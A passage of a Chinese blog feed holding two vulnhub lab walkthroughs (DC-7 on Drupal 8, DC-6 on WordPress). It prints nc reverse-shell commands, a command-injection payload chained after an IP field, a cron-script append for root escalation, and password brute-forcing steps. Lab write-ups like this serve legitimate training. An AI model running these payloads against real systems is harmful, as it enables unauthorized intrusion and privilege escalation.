id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.129</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107141329485.png" alt="image-20240107141329485"></p><p>我们通过wappalyzer发现cms是Drupal 8</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107141449784.png" alt="image-20240107141449784"></p><p>使用棱洞3.0指纹识别发现有Drupal</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nikto -h http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.129</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107142257358.png" alt="image-20240107142257358"></p><p>使用nikto工具扫描网站结构，发现robots.txt</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-首先我们查看robots-txt"><a href="#1-首先我们查看robots-txt" class="headerlink" title="1)首先我们查看robots.txt"></a>1)首先我们查看robots.txt</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107142856087.png" alt="image-20240107142856087"></p><p>可以看到是一些登录页面</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.129&#x2F;index.php&#x2F;user&#x2F;login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107143030472.png" alt="image-20240107143030472"></p><p>我们想的是暴力破解，但是题目提示我们不能暴力破解</p><p>’<img src="/./../imgs/$%7Bfiilename%7D/image-20240107143201720.png" alt="image-20240107143201720"></p><p>那么这个办法就行不通，我们试试Drupal8漏洞</p><h4 id="2-查看Drupal-8漏洞"><a href="#2-查看Drupal-8漏洞" class="headerlink" title="2)查看Drupal 8漏洞"></a>2)查看Drupal 8漏洞</h4><p>我们使用kali进行搜索Drupal8 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit Drupal <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107143429585.png" alt="image-20240107143429585"></p><p>找了一些Drupal 8 的漏洞 但是好像都不符合。</p><p>我们查看题目提示，说到谷歌可以提供很大的帮助，那么我们使用谷歌进行搜索</p><h4 id="3-google搜索"><a href="#3-google搜索" class="headerlink" title="3)google搜索"></a>3)google搜索</h4><p>我们再次查看页面，可以看到@DC7USER，我们进行搜索</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107143833324.png" alt="image-20240107143833324"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107144032699.png" alt="image-20240107144032699"></p><p>我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107144114598.png" alt="image-20240107144114598"></p><p>我们在config.php里面发现是用户名和密码，而且靶场开启了22端口，我们进行ssh</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107144152611.png" alt="image-20240107144152611"></p><h4 id="4-ssh登录"><a href="#4-ssh登录" class="headerlink" title="4)ssh登录"></a>4)ssh登录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> dc7user@192.168.52.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107144641435.png" alt="image-20240107144641435"></p><p>发现可以登录成功</p><p>我们查看里面的文件,发现有两个文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107150256840.png" alt="image-20240107150256840"></p><p>我们切换到backups文件夹当中，有两个加密的文件。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107150415171.png" alt="image-20240107150415171"></p><p>我们查看mbox文件，发现里面有一个定时任务 用root 运行&#x2F;opt&#x2F;scripts&#x2F;backups.sh。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107150655527.png" alt="image-20240107150655527"></p><p>查看下权限什么的，发现www-data拥有执行和写的权限，我们当前权限没有写权限，看来没办法动手脚了。</p><p>但是如果我们获得了www-data的shell 那就可以写点东西进去，然后依靠计划任务，用root去运行，那么我们可以获得了root权限的shell了。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107150910815.png" alt="image-20240107150910815"></p><p>我们查看backups.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107150838393.png" alt="image-20240107150838393"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107151025382.png" alt="image-20240107151025382"></p><p>可以看到命令是进入 cd &#x2F;var&#x2F;www&#x2F;html&#x2F; 后执行drush。然后去百度看看 drush是干什么呢？</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107151324192.png" alt="image-20240107151324192"></p><p>这里有写一些drush基本语法。</p><p><a href="https://www.howtoing.com/a-beginner-s-guide-to-drush-the-drupal-shell">https://www.howtoing.com/a-beginner-s-guide-to-drush-the-drupal-shell</a></p><pre class="line-numbers language-none"><code class="language-none">drush user-password admin --password&#x3D;&quot;new_pass&quot; #想要更改您的密码？就这么简单。#记得执行命令前先切换到Drupal的目录下面。cd &#x2F;var&#x2F;www&#x2F;html&#x2F;#Drupal默认账户是admin，ms02423是我设置的密码drush user-password admin --password&#x3D;&quot;ms02423&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107151725547.png" alt="image-20240107151725547"></p><p>这样就修改成功了,这里ssh登录就是为了修改后台密码</p><h4 id="5-安装php模块"><a href="#5-安装php模块" class="headerlink" title="5)安装php模块"></a>5)安装php模块</h4><p>我们可以看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107151840914.png" alt="image-20240107151840914"></p><p>进入到后台管理页面 然后就找写webshell的地方了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107195438599.png" alt="image-20240107195438599"></p><p>发现Content里面可以编辑文章，依次点击Manage ——&gt; Content ——&gt; Add content ——&gt; Basic page功能，尝试添加php一句话，但发现Drupal 8后为了安全需要将php单独作为一个模块导入；</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107195817029.png" alt="image-20240107195817029"></p><p>发现Extend里面可以安装新模块 试试可不可以安装php。</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">php 插件下载地址https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>ftp<span class="token punctuation">.</span>drupal<span class="token punctuation">.</span>org<span class="token operator">/</span>files<span class="token operator">/</span>projects<span class="token operator">/</span>php-8<span class="token punctuation">.</span>x-1<span class="token punctuation">.</span>x-dev<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107200017291.png" alt="image-20240107200017291"></p><p>不知道为什么我的靶场php安装不成功，试了好多次都没有成功，所以后面的内容就没有办法写了</p><p>我在网上找了一篇wp，链接地址为</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>csdn<span class="token punctuation">.</span>net<span class="token operator">/</span>qq_34028816<span class="token operator">/</span>article<span class="token operator">/</span>details<span class="token operator">/</span><span class="token number">124572886</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后面的内容因为我没有环境所以直接复制粘贴(ip地址为博主的ip地址)</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215004163.png" alt="image-20240107215004163"></p><p>安装成功</p><p>点击Enable newly added modules激活模块</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215038470.png" alt="image-20240107215038470"></p><p>点击前面的三角将前几栏折回，找到PHP Filetr勾选</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215115327.png" alt="image-20240107215115327"></p><p>并且点击install</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215146522.png" alt="image-20240107215146522"></p><p>我们可以看到安装成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215157777.png" alt="image-20240107215157777"></p><h4 id="6-写入一句话木马"><a href="#6-写入一句话木马" class="headerlink" title="6)写入一句话木马"></a>6)写入一句话木马</h4><p>我们写入一句话木马</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215226177.png" alt="image-20240107215226177"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215433021.png" alt="image-20240107215433021"></p><p>我们连接蚁剑，可以看到连接成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215533180.png" alt="image-20240107215533180"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215558738.png" alt="image-20240107215558738"></p><h4 id="7-kali反弹shell"><a href="#7-kali反弹shell" class="headerlink" title="7)kali反弹shell"></a>7)kali反弹shell</h4><p>kali端先监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4444</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215802992.png" alt="image-20240107215802992"></p><p>蚁剑终端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/sh <span class="token number">192.168</span>.1.11 <span class="token number">4444</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215817962.png" alt="image-20240107215817962"></p><p>我们可以看到监听成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215839317.png" alt="image-20240107215839317"></p><p>打开交互模式</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215917778.png" alt="image-20240107215917778"></p><h4 id="8-提权"><a href="#8-提权" class="headerlink" title="8)提权"></a>8)提权</h4><p>提权想到之前那个脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107215947890.png" alt="image-20240107215947890"></p><p>有权限</p><p>kali再监听一个端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">6666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107220042141.png" alt="image-20240107220042141"></p><p>将反弹shell写入脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"nc -e /bin/bash 192.168.1.11 6666"</span> <span class="token operator">>></span> /opt/scripts/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107220124037.png" alt="image-20240107220124037"></p><p>然后再执行脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107220152769.png" alt="image-20240107220152769"></p><p>提权到root</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107220229197.png" alt="image-20240107220229197"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell </p><p>9.实现交互式shell的几种方式</p><p>10.ssh登录</p><p>11.蚁剑的使用</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-6</title>
    <link href="http://ms02423.top/2024/01/06/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-6/"/>
    <id>http://ms02423.top/2024/01/06/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-6/</id>
    <published>2024-01-06T05:49:13.000Z</published>
    <updated>2024-01-07T14:09:21.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-6 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>This isn't an overly difficult challenge so should be great <span class="token keyword">for</span> beginners<span class="token punctuation">.</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场下载地址"><a href="#2-靶场下载地址" class="headerlink" title="2.靶场下载地址"></a>2.靶场下载地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>dc-6<span class="token punctuation">,</span><span class="token number">315</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-启动靶场环境"><a href="#3-启动靶场环境" class="headerlink" title="3.启动靶场环境"></a>3.启动靶场环境</h2><p>下载下来是虚拟机压缩文件，直接用Vmvare导入就行。然后调一下网络，建议调成NAT模式，桥接其实也行.</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106135646346.png" alt="image-20240106135646346"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶机真实IP"><a href="#1-寻找靶机真实IP" class="headerlink" title="(1)寻找靶机真实IP"></a>(1)寻找靶机真实IP</h3><p>使用nmap进行探活，寻找靶机ip</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">namp -sP <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106135837395.png" alt="image-20240106135837395"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106140058173.png" alt="image-20240106140058173"></p><p>我们知道靶场ip地址为192.168.52.137</p><h3 id="2-探端口及服务"><a href="#2-探端口及服务" class="headerlink" title="(2)探端口及服务"></a>(2)探端口及服务</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -A -v -p- <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.137</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106140416427.png" alt="image-20240106140416427"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">80</span>端口，存在web服务，Apache httpd <span class="token number">2.4</span><span class="token number">.25</span> <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>发现开放了<span class="token number">22</span>端口，OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>4p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb9u6 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以使用masscan探活端口</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">masscan --rate<span class="token operator">=</span><span class="token number">10000</span> --ports 0-65535 <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.137</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106140641551.png" alt="image-20240106140641551"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106140743488.png" alt="image-20240106140743488"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106140943867.png" alt="image-20240106140943867"></p><p>发现找不到，我们可以明显的看到ip变成了域名，那可以知道是由于DNS解析失败导致的，我们就需要在hosts文件中添加指向。</p><h4 id="1-windows修改hosts文件"><a href="#1-windows修改hosts文件" class="headerlink" title="1)windows修改hosts文件"></a>1)windows修改hosts文件</h4><p>打开hosts文件，hosts文件路径如下</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">C<span class="token punctuation">:</span>\WINDOWS\system32\drivers\etc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106142128890.png" alt="image-20240106142128890"></p><p>添加如下内容</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token level number">192</span><span class="token number">.168</span><span class="token number">.52</span><span class="token number">.137</span> wordy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106142311316.png" alt="image-20240106142311316"></p><h4 id="2-liunx修改hosts文件"><a href="#2-liunx修改hosts文件" class="headerlink" title="2)liunx修改hosts文件"></a>2)liunx修改hosts文件</h4><p>hosts文件路径如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Vim修改hosts文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106142555410.png" alt="image-20240106142555410"></p><h4 id="3-hosts文件修改成功"><a href="#3-hosts文件修改成功" class="headerlink" title="3)hosts文件修改成功"></a>3)hosts文件修改成功</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106144015180.png" alt="image-20240106144015180"></p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106205743696.png" alt="image-20240106205743696"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><p>使用nikto工具扫描网站结构，发现登录页面wp-login.php和一些其他的目录</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nikto -h http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.137</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106150433628.png" alt="image-20240106150433628"></p><h3 id="3-进行渗透测试"><a href="#3-进行渗透测试" class="headerlink" title="(3)进行渗透测试"></a>(3)进行渗透测试</h3><h4 id="1-访问登录页面"><a href="#1-访问登录页面" class="headerlink" title="1)访问登录页面"></a>1)访问登录页面</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106150637351.png" alt="image-20240106150637351"></p><p>但是我们不知道用户名和密码，我们可以进行爆破</p><h4 id="2-获取用户名"><a href="#2-获取用户名" class="headerlink" title="2)获取用户名"></a>2)获取用户名</h4><p>我们使用wpscan进行爆破用户名</p><p>使用wpscan工具对wordpress网站扫描获取WordPress可以登录的用户</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">wpscan --url wordy -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106151019138.png" alt="image-20240106151019138"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106151110018.png" alt="image-20240106151110018"></p><p>我们可以发现5个用户名</p><h4 id="3-制作用户字典"><a href="#3-制作用户字典" class="headerlink" title="3)制作用户字典"></a>3)制作用户字典</h4><p>题目中给出了提示，告诉了我们密码字典的生成方式</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106153118646.png" alt="image-20240106153118646"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106153234123.png" alt="image-20240106153234123"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token keyword">cd</span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlistscp rockyou<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>gz rockyou<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>gz<span class="token punctuation">.</span>bakgunzip rockyou<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>gz rockyou<span class="token punctuation">.</span>txtcat <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span>rockyou<span class="token punctuation">.</span>txt | grep k01 <span class="token operator">></span> wordy-pass1<span class="token punctuation">.</span>dic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106153629093.png" alt="image-20240106153629093"></p><h4 id="4-爆破用户名和密码"><a href="#4-爆破用户名和密码" class="headerlink" title="4)爆破用户名和密码"></a>4)爆破用户名和密码</h4><p>爆破时间有点长</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106154303260.png" alt="image-20240106154303260"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106154331079.png" alt="image-20240106154331079"></p><p>用户名是mark 密码helpdesk01</p><h4 id="5-进行登录"><a href="#5-进行登录" class="headerlink" title="5)进行登录"></a>5)进行登录</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>wordy<span class="token operator">/</span>wp-login<span class="token punctuation">.</span>phpMark<span class="token operator">/</span>helpdesk01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106154541856.png" alt="image-20240106154541856"></p><h4 id="6-发现RCE漏洞"><a href="#6-发现RCE漏洞" class="headerlink" title="6)发现RCE漏洞"></a>6)发现RCE漏洞</h4><p>简单看一下页面，发现存在activity_monitor插件，存在功能 IP 转十进制和一个域名解析lookup的功能、使用nslookup命令执行的，可能存在一个RCE的漏洞。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106154836166.png" alt="image-20240106154836166"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106155007452.png" alt="image-20240106155007452"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106155022692.png" alt="image-20240106155022692"></p><p>发现长度限制并绕过</p><pre><code>发现在前端做了长度限制，最长长度只能输入15个字符，就是说输入114.114.114.114的话没办法加命令，这里提供两个思路，一个就是采用burp抓包修改，一个就是直接修改html我这里采用修改html的方式绕过长度限制打开开发者模式F12输入114.114.114.114，点击lookup，采用小箭头找到输入框，找到114的位置，把114.114.114.114改成114.114.114.114;whoami，然后再次点击lookup，命令执行成功，同理我们可以反弹shell</code></pre><p>我们使用看到无法输入</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106155219804.png" alt="image-20240106155219804"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106155451150.png" alt="image-20240106155451150"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106155601516.png" alt="image-20240106155601516"></p><h3 id="4-反弹shell到kali"><a href="#4-反弹shell到kali" class="headerlink" title="(4)反弹shell到kali"></a>(4)反弹shell到kali</h3><h4 id="1-kali进行监听"><a href="#1-kali进行监听" class="headerlink" title="1)kali进行监听"></a>1)kali进行监听</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nc -lvnp <span class="token number">55555</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-靶机执行命令"><a href="#2-靶机执行命令" class="headerlink" title="2)靶机执行命令"></a>2)靶机执行命令</h4><p>把html输入内容位置改成反弹的命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">114.114</span>.114.114<span class="token punctuation">;</span><span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/bash <span class="token number">192.168</span>.52.152 <span class="token number">55555</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-监听成功"><a href="#3-监听成功" class="headerlink" title="3)监听成功"></a>3)监听成功</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106160119704.png" alt="image-20240106160119704"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106160805765.png" alt="image-20240106160805765"></p><h4 id="4-进入交互式shell"><a href="#4-进入交互式shell" class="headerlink" title="4)进入交互式shell"></a>4)进入交互式shell</h4><p>这个shell不好用，进入交互式shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" 